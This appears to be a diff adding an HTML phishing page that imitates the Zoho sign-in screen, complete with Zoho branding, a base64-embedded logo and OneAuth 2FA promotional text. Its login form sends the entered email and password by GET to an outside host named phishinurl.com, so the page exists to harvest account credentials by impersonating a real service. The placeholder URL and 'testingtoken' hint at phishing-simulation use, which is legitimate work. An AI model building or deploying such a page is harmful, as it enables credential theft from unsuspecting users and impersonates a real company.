@@ -1,0 +1,167 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zoho Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #333;
+        }
+        .container {
+            display: flex;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            width: 900px;
+            overflow: hidden;
+        }
+        .login-section {
+            padding: 40px;
+            flex: 1;
+            border-right: 1px solid #ddd;
+        }
+        .login-section img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+        .login-section h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .input-container {
+            margin-bottom: 20px;
+            text-align: left;
+            position: relative;
+        }
+        .input-container input {
+            width: 100%;
+            padding: 10px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .input-container .show-password {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            cursor: pointer;
+            color: #0073b1;
+        }
+        .forgot-password {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .btn {
+            background-color: #0073b1;
+            color: #fff;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+            width: 100%;
+            margin-bottom: 20px;
+        }
+        .btn:hover {
+            background-color: #005bb5;
+        }
+        .otp-link, .google-btn {
+            display: block;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .google-btn {
+            border: 1px solid #ccc;
+            padding: 10px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .google-btn img {
+            vertical-align: middle;
+            margin-right: 10px;
+            width: 20px;
+            height: 20px;
+        }
+        .info-section {
+            padding: 40px;
+            flex: 1;
+            background-color: #f9f9f9;
+        }
+        .info-section h2 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .info-section p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .info-section a {
+            display: inline-block;
+            margin-top: 10px;
+            color: #0073b1;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="login-section">
+            <img src="data:image/jpeg;base64,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REBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREBERAREQEREH//Z" alt="Zoho Logo">
+            <h2>Sign in</h2>
+            <form action="http://phishinurl.com/?csrf-token=testingtoken" method="GET">
+                <div class="input-container">
+                    <input type="text" id="email" name="email" placeholder="Email address or mobile number" required>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="password" name="password" placeholder="Password" required>
+                    <span class="show-password" onclick="togglePassword()">Show</span>
+                </div>
+                <div class="forgot-password">
+                    <a href="#">Forgot Password?</a>
+                </div>
+                <button type="submit" class="btn">Sign in</button>
+                <a href="#" class="otp-link">Use OTP to Login</a>
+            </form>
+        </div>
+        <div class="info-section">
+            <h2>MFA for all accounts</h2>
+            <p>Secure online accounts with OneAuth 2FA. Back up OTP secrets and never lose access to your accounts.</p>
+            <a href="#">Learn more</a>
+        </div>
+    </div>
+
+    <script>
+        function togglePassword() {
+            var passwordField = document.getElementById('password');
+            var showPasswordText = document.querySelector('.show-password');
+            if (passwordField.type === 'password') {
+                passwordField.type = 'text';
+                showPasswordText.textContent = 'Hide';
+            } else {
+                passwordField.type = 'password';
+                showPasswordText.textContent = 'Show';
+            }
+        }
+    </script>
+</body>
+</html>
